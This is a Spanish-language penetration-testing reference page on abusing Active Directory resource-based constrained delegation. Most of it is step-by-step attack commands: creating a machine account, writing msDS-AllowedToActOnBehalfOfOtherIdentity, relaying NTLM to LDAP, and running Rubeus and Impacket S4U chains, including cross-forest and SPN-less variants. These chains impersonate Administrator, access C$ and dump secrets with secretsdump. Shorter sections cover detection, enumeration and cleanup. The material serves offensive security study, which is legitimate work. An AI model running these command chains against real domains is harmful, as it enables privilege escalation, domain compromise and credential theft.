# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Conceptos básicos de Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) es similar a [constrained delegation](constrained-delegation.md), pero la dirección de confianza está invertida. La constrained delegation tradicional registra a qué servicios puede delegar una entidad; RBCD registra en el **recurso de destino** qué entidades pueden suplantar usuarios ante él.<sup>[[12]](#references)</sup>

El atributo _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ del objeto de destino contiene un descriptor de seguridad que identifica las entidades autorizadas a actuar en nombre de otras identidades ante ese recurso.

Otra diferencia importante es que una entidad con suficientes **permisos de escritura sobre una cuenta de equipo** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` y derechos similares) podría establecer _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Configurar la constrained delegation tradicional normalmente requiere acceso administrativo más privilegiado.<sup>[[1]](#references)</sup>

Más precisamente, cambiar la configuración clásica de constrained delegation normalmente está restringido por `SeEnableDelegationPrivilege` en un controlador de dominio, un derecho que suelen tener administradores con muchos privilegios. RBCD traslada la decisión al descriptor de seguridad del objeto de destino, por lo que el acceso de escritura a la propiedad correspondiente del objeto de equipo puede ser suficiente, sin necesidad de ese derecho de usuario.<sup>[[1]](#references)[[2]](#references)</sup>

### Nuevos conceptos

El flag **`TrustedToAuthForDelegation`** en `userAccountControl` suele describirse como requisito previo para **S4U2Self**, pero esto es incompleto.\
Una entidad de servicio con un SPN puede solicitar S4U2Self sin el flag. Con `TrustedToAuthForDelegation`, el ticket de servicio devuelto es **forwardable**; sin él, normalmente el ticket es **non-forwardable**.<sup>[[5]](#references)</sup>

La constrained delegation tradicional rechaza un **TGS non-forwardable** en el paso S4U2Proxy. RBCD puede aceptar ese ticket S4U2Self si el descriptor de seguridad del destino autoriza al servicio solicitante.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Estructura del ataque

> Si tienes **privilegios equivalentes a escritura** sobre una **cuenta de equipo**, podrías obtener acceso privilegiado a esa máquina.

Supongamos que el atacante ya tiene **privilegios equivalentes a escritura sobre el objeto de equipo de la víctima**.

1. El atacante **compromete** una cuenta con un **SPN** o **crea una** («Service A»). De forma predeterminada, un usuario autenticado del dominio puede crear hasta 10 objetos de equipo, según lo establecido por **_MachineAccountQuota_**; un objeto de equipo proporciona automáticamente SPN utilizables.
2. El atacante **abusa de su privilegio WRITE** sobre el equipo de la víctima (ServiceB) para configurar **resource-based constrained delegation y permitir que ServiceA suplante a cualquier usuario** ante ese equipo de la víctima (ServiceB).
3. El atacante usa Rubeus para realizar un **ataque S4U completo** (S4U2Self y S4U2Proxy) desde Service A hasta Service B en nombre de un usuario **con acceso privilegiado a Service B**.
   1. S4U2Self (desde la cuenta SPN comprometida o creada): solicitar un **TGS que represente a Administrator ante Service A** (non-forwardable).
   2. S4U2Proxy: usar ese **TGS non-forwardable** para solicitar un ticket de servicio que represente a **Administrator** ante el **host de la víctima**.
   3. El ticket non-forwardable puede funcionar igualmente en este flujo RBCD porque Service A está autorizado en el descriptor de seguridad del recurso de destino.
4. El atacante puede hacer **pass-the-ticket** y **suplantar** al usuario para obtener **acceso a la víctima ServiceB**.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` cierra la vía predeterminada de creación de equipos, pero no elimina los permisos de escritura sobre el objeto de equipo de destino ni el control de una cuenta existente. A veces se puede usar como entidad delegante un usuario ordinario controlado que no tenga un SPN, mediante el [método U2U sin SPN](#spn-less-cross-domain--cross-forest-rbcd), incluso dentro de un mismo dominio. Esa vía sigue requiriendo un permiso de escritura RBCD efectivo, el control de las credenciales del usuario delegante, una identidad suplantada que permita la delegación, un comportamiento de cifrado Kerberos compatible y un cambio del hash NT que interrumpa la cuenta. Trata estos elementos como requisitos previos independientes; un atributo RBCD vacío o una cuota cero, por sí solos, no demuestran que el ataque vaya a funcionar ni que el entorno sea seguro.

Un descriptor RBCD existente también puede especificar un **grupo** en lugar del equipo delegante directamente. Si controlas una cuenta de equipo que tiene un SPN y puedes agregarla a ese grupo, la nueva pertenencia puede proporcionar la vía de delegación sin cambiar el atributo RBCD del equipo de destino. Antes de concluir que la vía funciona, revisa la ACL efectiva de escritura de pertenencia del grupo (incluidas las ACE de denegación), la pertenencia anidada y la actualización del token, el SID del principal indicado en el descriptor, las restricciones de delegación de la cuenta suplantada y el SPN del servicio de destino.

Para comprobar el _**MachineAccountQuota**_ del dominio, puedes usar:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Ataque

### Crear un objeto de equipo

Puedes crear un objeto de equipo en el dominio usando **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Configuración de la delegación restringida basada en recursos

**Uso del módulo PowerShell de Active Directory**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Usando powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Realizar un ataque S4U completo (Windows/Rubeus)

En primer lugar, creamos el nuevo objeto de equipo con la contraseña `123456`, así que necesitamos el hash de esa contraseña:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Esto imprimirá los hashes RC4 y AES de esa cuenta.\
Ahora, el ataque puede realizarse:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Puedes generar más tickets para más servicios con solo solicitarlo una vez usando el parámetro `/altservice` de Rubeus:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Los usuarios pueden tener marcada la opción **"La cuenta es confidencial y no se puede delegar."** Si esta opción está habilitada, no se puede suplantar la identidad de la cuenta mediante este flujo de delegación. BloodHound muestra esta propiedad durante el análisis.

### Herramientas de Linux: RBCD de extremo a extremo con Impacket (2024+)

Si trabajas desde Linux, puedes ejecutar toda la cadena RBCD con las herramientas oficiales de Impacket:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Notas
- Si se exige LDAP signing/LDAPS, usa `impacket-rbcd -use-ldaps ...`.
- Prefiere claves AES; muchos dominios modernos restringen RC4. Tanto Impacket como Rubeus admiten flujos que usan solo AES.
- Impacket puede reescribir el `sname` ("AnySPN") para algunas herramientas, pero obtén el SPN correcto siempre que sea posible (p. ej., CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### RBCD reflectivo para un delegador Kerberos-only sin SPN

Un usuario comprometido con **`msDS-AllowedToDelegateTo` pero sin SPN ni `TrustedToAuthForDelegation`** no puede generar el ticket de evidencia forwardable necesario para la [delegación restringida Kerberos-only](constrained-delegation.md#protocol-transition-vs-kerberos-only-constrained-delegation) mediante S4U2Self ordinario.<sup>[[1]](#references)[[18]](#references)</sup> Si ese usuario puede escribir RBCD en su **propio** objeto de AD, una cuenta controlada por el atacante que tenga un SPN puede delegar primero *al usuario*.<sup>[[1]](#references)[[18]](#references)</sup> Este salto RBCD genera un ticket forwardable para el usuario suplantado destinado a la cuenta sin SPN, que sirve como evidencia para un segundo S4U2Proxy a un SPN de la lista de permitidos de delegación clásica de la cuenta comprometida.<sup>[[18]](#references)[[19]](#references)</sup>

Para el primer salto sin SPN, la solicitud S4U2Proxy de la cuenta auxiliar debe usar **U2U**: `enc-tkt-in-skey` hace que el KDC cifre el ticket con la clave de sesión del TGT del delegador, en lugar de buscar una clave de SPN.<sup>[[18]](#references)[[19]](#references)</sup> El KDC también necesita el bit RBCD en `PA-PAC-OPTIONS`, el TGT del delegador y el ticket de evidencia S4U2Self.<sup>[[18]](#references)[[20]](#references)</sup> La bifurcación de `getST.py` de Impacket del autor añade `-nospn` y `-tgt` para esta solicitud; la compatibilidad con `-nospn`/`-tgt` está en el PR #2324 de Impacket upstream, así que usa la bifurcación enlazada en vez de asumir que `getST.py` estándar admite ese paso.<sup>[[18]](#references)[[20]](#references)</sup>

Este ejemplo supone que `svc_web` está comprometida, puede escribir su propio atributo RBCD y tiene permiso para delegar a `host/dc01.corp.local`. También supone que se puede crear una cuenta auxiliar con SPN, que se permite RC4 y que el `Administrator` elegido es delegable. Solicita un **TGT RC4** con el hash NT de la cuenta comprometida. Ejecuta el **primer** `getST.py` desde la bifurcación del autor; inspecciona la salida de `describeTicket.py` y sustituye abajo la **clave de sesión del TGT RC4** correspondiente. El último `getST.py` puede ser el de Impacket estándar. Solicita el TGT **antes** de cambiar el hash NT; este cambio interrumpe el servicio de la cuenta hasta que se restablezca su contraseña.<sup>[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

```bash
pypykatz crypto nt 'OldPass!'
getTGT.py -hashes ':<CURRENT_NT_HASH>' 'corp.local/svc_web' -dc-ip 10.0.0.10
describeTicket.py svc_web.ccache
addcomputer.py -computer-name 'HELPER$' -computer-pass 'HelperPass!' -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
rbcd.py -delegate-from 'HELPER$' -delegate-to svc_web -action write -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
changepasswd.py 'corp.local/svc_web:OldPass!@10.0.0.10' -newhashes ':<RC4_TGT_SESSION_KEY>'
python3 ./getST.py -u2u -impersonate Administrator -nospn svc_web -tgt svc_web.ccache -dc-ip 10.0.0.10 'corp.local/HELPER$:HelperPass!'
KRB5CCNAME=svc_web.ccache impacket-getST -impersonate Administrator -spn host/dc01.corp.local -additional-ticket 'Administrator@svc_web@CORP.LOCAL.ccache' -k -no-pass -dc-ip 10.0.0.10 'corp.local/svc_web'
```

A diferencia de la [ruta RBCD sin SPN que aparece abajo](#spn-less-cross-domain--cross-forest-rbcd), esta cadena usa la cuenta sin SPN como **destino RBCD y luego como delegador KCD clásico**. Sigue necesitando otra cuenta controlada con un SPN. Si `MachineAccountQuota=0`, una cuenta con SPN que ya esté bajo tu control puede reemplazar al nuevo equipo; una cuota de cero por sí sola no impide esta ruta.<sup>[[18]](#references)[[19]](#references)</sup>

## RBCD entre dominios y entre bosques

Si el **principal delegador** que controlas reside en un **dominio diferente** (o incluso en un **bosque diferente**) al del **equipo de recurso**, el abuso sigue siendo **RBCD**, pero el flujo de tickets ya no es el habitual `S4U2Self -> S4U2Proxy` de un solo dominio.

### RBCD entre dominios: configura el principal externo mediante su SID

Al establecer `msDS-AllowedToActOnBehalfOfOtherIdentity` desde un **dominio diferente**, es posible que el equipo/usuario externo **no se pueda resolver por nombre** en LDAP del dominio de destino. En ese caso, configura la entrada de delegación usando el **SID** del principal externo en lugar de su sAMAccountName/UPN.

Esto es especialmente relevante al retransmitir NTLM a LDAP con `ntlmrelayx.py`:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Notes:
- `--sid` indica a `ntlmrelayx.py` que trate `--escalate-user` como un SID, lo cual es necesario cuando la cuenta delegante es externa al dominio objetivo.
- Aunque la herramienta muestre `User not found in LDAP`, la escritura de la delegación puede tener éxito porque el descriptor de seguridad almacena directamente el SID externo.

### Cross-domain RBCD: secuencia S4U entre realms

Una vez que el principal externo está en `msDS-AllowedToActOnBehalfOfOtherIdentity`, el flujo de trabajo entre dominios es:<sup>[[9]](#references)[[13]](#references)</sup>

1. Obtener un **TGT** para el principal delegante desde su propio dominio.
2. Solicitar un **TGT de referral** para `krbtgt/<target-domain>`.
3. Solicitar un **referral S4U2Self entre realms** para el usuario suplantado en el DC del dominio objetivo.
4. Solicitar el ticket **S4U2Self** real para ese usuario, de vuelta en el dominio del delegante.
5. Realizar **S4U2Proxy** en el dominio del delegante para obtener un ticket de referral para el dominio objetivo.
6. Realizar el **S4U2Proxy** final en el DC del dominio objetivo para obtener el ticket de servicio para `cifs/host.target`, `host/host.target`, etc.

Por eso, las herramientas estándar de Linux suelen fallar con RBCD entre dominios:<sup>[[9]](#references)</sup>
- Puede que el **realm** de la solicitud deba diferir del realm del TGT usado en el `TGS-REQ`.
- La cadena requiere **pasos S4U2Proxy independientes**, no solo `S4U2Self` o `S4U2Self` seguido inmediatamente de un único `S4U2Proxy`.

### RBCD entre dominios desde Linux

Synacktiv publicó una implementación de Impacket `getST.py` que reproduce la secuencia entre realms desde Linux al gestionar explícitamente los dos KDC:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Operativamente, los nuevos argumentos son:
- `-dc-ip`: DC del dominio **delegante**
- `-targetdomain`: dominio del **equipo de recurso**
- `-targetdc`: DC del dominio de **recurso**

### Limitaciones de RBCD entre bosques

RBCD entre bosques tiene una limitación importante: **el usuario suplantado debe pertenecer al mismo bosque que el principal delegante**. En otras palabras, si la cuenta de máquina que controlas está en `valhalla.local` y el recurso de destino está en `asgard.local`, por lo general **no puedes suplantar a usuarios arbitrarios de `asgard.local` para acceder a ese recurso mediante RBCD**.<sup>[[9]](#references)</sup>

Sigue siendo explotable cuando:
- el usuario del **bosque delegante** es **administrador local** (o tiene privilegios de otro tipo) en el host de recurso del otro bosque
- una relación de confianza permite la ruta de autenticación requerida y el SID externo se acepta en el descriptor de seguridad del equipo de destino

### Particularidades del protocolo RBCD entre bosques

RBCD entre bosques no es simplemente «entre dominios más una relación de confianza». El flujo observado incluye dos particularidades que las herramientas comunes no han tenido en cuenta históricamente:<sup>[[9]](#references)</sup>

1. Una solicitud adicional **S4U2Proxy** que establece **`PA-PAC-OPTIONS=branch-aware`**
2. Un ticket de servicio final que puede devolverse usando **RC4**, incluso cuando se solicitaron otros tipos de cifrado

El flujo práctico es:

1. Obtener un TGT para el principal delegante del bosque A.
2. Solicitar **S4U2Self** para el usuario suplantado en el bosque A.
3. Solicitar **S4U2Proxy** en el bosque A para obtener un TGT de referencia para el bosque B.
4. Enviar una segunda solicitud **S4U2Proxy** en el bosque A **sin** el ticket S4U2Self como ticket adicional, pero con `branch-aware` habilitado, para obtener otro TGT de referencia para el bosque B.
5. Opcionalmente, solicitar un ticket de servicio normal en el bosque B para el principal delegante (este ticket no es necesario para el abuso final).
6. Usar los tickets de referencia de los pasos 3 y 4 para solicitar el ticket **S4U2Proxy** final en el bosque B para el usuario del bosque A suplantado, dirigido al SPN de destino.

### RBCD entre bosques desde Linux

La misma rama de Impacket de Synacktiv añade un modificador `-forest` para esta lógica:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### RBCD recursivo en varios dominios (3+ dominios)

En los **bosques multidominio**, tanto **S4U2Self** como **S4U2Proxy** pueden ser **recursivos** en lugar de detenerse tras una sola referencia:

- **S4U2Self recursivo**: el primer `S4U2Self` se envía al **dominio del usuario suplantado**, se recorren los saltos intermedios entre dominios padre/hijo mediante referencias `TGS-REQ` normales para `krbtgt/<REALM>`, y el **`S4U2Self` final** se envía en el **dominio propio del principal delegante**.
- Esto significa que **basta con tener un TGT** de una cuenta de máquina para suplantar a un **administrador de otro dominio del mismo bosque** y solicitar `cifs/host`, `host/host`, `wsman/host`, etc.
- **S4U2Proxy recursivo** sigue la cadena de confianza del mismo modo: los saltos intermedios reutilizan el ticket anterior como TGT mientras solicitan la siguiente referencia `krbtgt/<REALM>`, y solo el último salto devuelve el ticket de servicio final.<sup>[[10]](#references)</sup>

Un ejemplo práctico en el mismo bosque es:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### RBCD sin SPN entre dominios o bosques

Si el **principal delegante es un usuario sin SPN**, el último `S4U2Self` recursivo falla con **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. La solución alternativa es **reintentar solo el último salto como `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Resumen de la cadena de abuso:

1. Autenticarse con el **NT hash** para que el KDC use **RC4-HMAC (etype 23)**.
2. Solicitar primero **`-self -u2u`** y mantener ese ticket separado del paso proxy posterior.
3. Extraer la **clave de sesión del TGT** con `describeTicket.py`.
4. Reemplazar el **NT hash** del usuario por esa **clave de sesión** usando `changepasswd.py -newhashes <session_key>`.
5. Reutilizar el ticket `S4U2Self+U2U` como **`-additional-ticket`** durante una solicitud **`-proxy`** independiente.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Advertencias operativas:

- Cuando el **primer salto de confianza ya es otro forest**, prefiere el algoritmo **branch-aware** (`getST.py ... -forest`) para ajustarte al comportamiento nativo de Windows. Si solo se llega al forest externo más adelante en la cadena, es posible que el flujo recursivo no branch-aware siga funcionando.<sup>[[9]](#references)</sup>
- En DCs recientes de **Windows Server 2022/2025**, forzar RC4 puede fallar con **`KDC_ERR_ETYPE_NOSUPP`** debido a la obsolescencia de RC4; esto puede hacer imposible **RBCD sin SPN**, aunque RBCD clásico respaldado por SPN siga funcionando con AES.<sup>[[15]](#references)</sup>
- Ejecuta **`S4U2Self+U2U` antes de cambiar el hash/contraseña del usuario**: **`SamrChangePasswordUser`** no vuelve a calcular las claves AES de Kerberos de la cuenta, por lo que cambiar primero la contraseña puede impedir solicitudes posteriores de tickets.<sup>[[14]](#references)</sup>
- La cuenta suplantada todavía debe permitir la **delegación**: **Protected Users** y las cuentas con **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** bloquean la cadena.

## Notas de detección / hardening

- Las rutas RBCD entre dominios/forests suelen crearse mediante **abuso de ACL** o **relay-to-LDAP**. Exige **LDAP signing** y **LDAP channel binding** en los DCs para interrumpir las rutas de configuración más comunes.
- Audita quién puede escribir `msDS-AllowedToActOnBehalfOfOtherIdentity` en los objetos de equipo y resuelve los SID almacenados, incluidos los **foreign security principals**.
- En entornos con muchas relaciones de confianza, revisa **Selective Authentication**, **SID filtering** y si los usuarios de un forest externo tienen derechos de **administrador local** en los hosts de recursos.

### Acceso

La última línea de comandos realizará el **ataque S4U completo e inyectará el TGS** de Administrator al host víctima en **memoria**.\
En este ejemplo, se solicitó un TGS para el servicio **CIFS** de Administrator, así que podrás acceder a **C$**:

```bash
ls \\victim.domain.local\C$
```

### Abusar de diferentes tickets de servicio

Aprende sobre los [**tickets de servicio disponibles aquí**](silver-ticket.md#available-services).

## Enumeración, auditoría y limpieza

### Enumerar equipos con RBCD configurado

PowerShell (decodificando el SD para resolver los SID):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (leer o vaciar con un comando):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Limpieza / restablecimiento de RBCD

- PowerShell (borrar el atributo):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Errores de Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Esto significa que Kerberos está configurado para no usar DES ni RC4 y que solo estás proporcionando el hash de RC4. Proporciona a Rubeus al menos el hash AES256 (o simplemente proporciona los hashes de rc4, aes128 y aes256). Ejemplo: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** durante `-self` para un usuario normal: es probable que el principal delegante **no tenga un SPN**. Vuelve a intentar el **último salto** como **`S4U2Self+U2U`** en lugar de un `S4U2Self` normal.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** durante **RBCD sin SPN**: los DC recientes pueden rechazar la ruta **RC4-HMAC** forzada que requiere el truco de `S4U2Self+U2U` + sustitución de la clave de sesión. Prueba una ruta clásica de **RBCD respaldada por SPN** con AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Esto significa que la hora del equipo actual es distinta de la del DC y que Kerberos no funciona correctamente.
- **`preauth_failed`**: Esto significa que el nombre de usuario y los hashes proporcionados no permiten iniciar sesión. Es posible que hayas olvidado incluir el carácter "$" en el nombre de usuario al generar los hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`** durante S4U2Proxy: Comprueba las restricciones de delegación de la cuenta suplantada, la marca de reenviable del ticket de evidencia y si KCD clásico o el descriptor RBCD del objetivo autorizan este salto. Este es un **error de política de delegación del KDC**, no una prueba de si el servicio objetivo está en ejecución o de si el usuario tiene acceso a nivel de aplicación. Un SPN de destino no registrado normalmente produce **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**.<sup>[[21]](#references)[[22]](#references)</sup>

## Notas, relays y alternativas

- También puedes escribir el RBCD SD mediante AD Web Services (ADWS) si LDAP está filtrado. Consulta:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Las cadenas de relay de Kerberos suelen terminar en RBCD para obtener SYSTEM local en un solo paso. Consulta ejemplos prácticos de extremo a extremo:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Si la firma LDAP y el channel binding están **deshabilitados** y puedes crear una cuenta de equipo, herramientas como **KrbRelayUp** pueden retransmitir a LDAP una autenticación Kerberos forzada, establecer `msDS-AllowedToActOnBehalfOfOtherIdentity` para tu cuenta de equipo en el objeto del equipo objetivo e suplantar inmediatamente a **Administrator** mediante S4U desde otro host.<sup>[[8]](#references)</sup>

## References

- [1] [Meneando al perro: abuso de la delegación restringida basada en recursos para atacar Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Otra palabra sobre delegación – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Delegación restringida basada en recursos de Kerberos: toma de control de objetos de equipo](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Abuso de la delegación restringida basada en recursos](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity acabó con el dominio: una introducción ofensiva a Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (oficial)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Guía rápida de Linux con sintaxis reciente](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (firma LDAP desactivada → relay de Kerberos a RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Exploración de RBCD entre dominios y bosques](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Exploración de RBCD entre dominios y bosques: parte 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Rama de Impacket de Synacktiv - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Introducción a la delegación restringida de Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Especificaciones abiertas de Microsoft - S4U2Self entre dominios](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Especificaciones abiertas de Microsoft - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Detectar y corregir el uso de RC4 en Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Especificaciones abiertas de Microsoft – Detalles de S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
- [17] [James Forshaw - Explotación de RBCD con una cuenta de usuario normal](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
- [18] [Hunter Wade - Abuso de la delegación restringida sin transición de protocolo contra cuentas sin SPN](https://hunio.org/security/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts/)
- [19] [Sprocket Security - Abuso de la delegación restringida sin transición de protocolo contra cuentas sin SPN](https://www.sprocketsecurity.com/blog/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts)
- [20] [Impacket PR #2324 - S4U2Proxy con U2U](https://github.com/fortra/impacket/pull/2324)
- [21] [Microsoft MS-SFU - Uso de ServicesAllowedToSendForwardedTicketsTo](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/6d76bf10-3c48-4e14-9992-df1bd456455e)
